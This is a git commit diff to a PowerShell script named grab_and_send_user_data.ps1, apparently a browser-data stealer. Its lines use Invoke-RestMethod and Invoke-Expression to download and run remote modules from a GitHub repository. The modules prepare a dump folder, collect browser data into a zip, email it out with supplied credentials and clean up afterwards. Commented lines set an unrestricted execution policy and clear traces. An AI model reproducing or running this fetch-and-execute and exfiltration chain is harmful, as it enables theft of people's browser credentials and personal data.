3e936eae58da1daf207699468279fb310af3209c
jfkd02ks <115693098+jfkd02ks@users.noreply.github.com>
2022-10-16 11:06:47 +0300

    Update grab_and_send_user_data.ps1

--- grab_and_send_user_data.ps1
+++ grab_and_send_user_data.ps1
@@ -8,7 +8,7 @@ param (
 # Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
 # Remove-Variable * -ErrorAction SilentlyContinue; Remove-Module *; $error.Clear(); Clear-Host
 
-Invoke-Expression "& { $(Invoke-RestMethod "https://github.com/jfkd02ks/playwithcode/raw/main/modules/work_folder_preparation.ps1") }"
-Invoke-Expression "& { $(Invoke-RestMethod "https://github.com/jfkd02ks/playwithcode/raw/main/modules/get_browsers_data.ps1") } browserdata.zip"
-Invoke-Expression "& { $(Invoke-RestMethod "https://github.com/jfkd02ks/playwithcode/raw/main/modules/sendto_email.ps1") } $Username $Password $env:appdata\Microsoft\dump\browserdata.zip"
-Invoke-Expression "& { $(Invoke-RestMethod "https://github.com/jfkd02ks/playwithcode/raw/main/modules/cleanup.ps1") }"
+Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/prepare_work_folder.ps1) }"
+Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/grab_browsers_data.ps1) } browserdata.zip"
+Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/sendto_email.ps1) } $Username $Password $env:appdata\Microsoft\dump\browserdata.zip"
+Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/cleanup.ps1) }"
